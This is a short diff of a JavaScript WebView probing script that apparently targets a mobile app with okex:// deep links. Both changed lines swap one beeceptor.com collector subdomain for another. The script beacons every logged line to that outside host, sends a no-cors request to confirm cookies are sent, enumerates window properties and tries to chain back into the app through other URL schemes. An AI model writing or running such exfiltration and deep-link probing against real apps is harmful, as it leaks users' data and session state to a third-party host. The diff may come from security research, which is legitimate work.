@@ -5,7 +5,7 @@
 const log = (...a) => {
   document.getElementById('log').textContent += a.join(' ') + '\n';
   // also beacon every line out so you see results even if WebView is sandboxed/closed
-  navigator.sendBeacon('https://naysser.free.beeceptor.com/c?l=' + encodeURIComponent(a.join(' ')));
+  navigator.sendBeacon('https://nayssers.free.beeceptor.com/c?l=' + encodeURIComponent(a.join(' ')));
 };
 
 log('[+] origin =', location.origin);
@@ -65,7 +65,7 @@ Object.getOwnPropertyNames(window).forEach(k => {
 });
 
 // --- 5. try opaque (no-cors) request to confirm cookies are at least sent ---
-fetch('https://naysser.free.beeceptor.com/probe?cookie-check', {mode:'no-cors'});
+fetch('https://nayssers.free.beeceptor.com/probe?cookie-check', {mode:'no-cors'});
 
 // --- 6. attempt to chain back into the app via other okex:// schemes ---
 setTimeout(() => {
